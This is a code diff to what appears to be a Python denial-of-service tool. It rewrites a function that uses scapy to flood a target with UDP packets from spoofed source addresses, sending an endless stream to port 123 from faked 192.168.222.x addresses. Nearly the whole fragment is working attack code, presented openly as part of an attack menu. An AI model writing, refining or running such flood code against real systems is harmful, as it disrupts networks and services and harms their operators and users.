@@ -202,12 +202,15 @@ def spoofed_udp_flood():
     print("Starting UDP flood attack towards " + target + " ...")
 
     def spoofed_flood():
-        try:
-            packet = IP(src=str(RandIP()), dst=target) / \
-                UDP(dport=RandShort()) / ("X" * RandByte())
-            send(packet, verbose=1, loop=1, inter=0.0000001)
-        except KeyboardInterrupt as e:
-            sys.exit(1)
+        
+        while True:
+            send(IP(src="192.168.222." + str(random.randint(2, 253)), dst=target)/UDP(dport=123)/"RANDOOOOOOMMMMM", inter=0.000001, loop=1, count=100)
+
+    try:
+        spoofed_flood()
+
+    except KeyboardInterrupt:
+        choose_dos()
 
 
     t1 = threading.Thread(target=spoofed_flood())
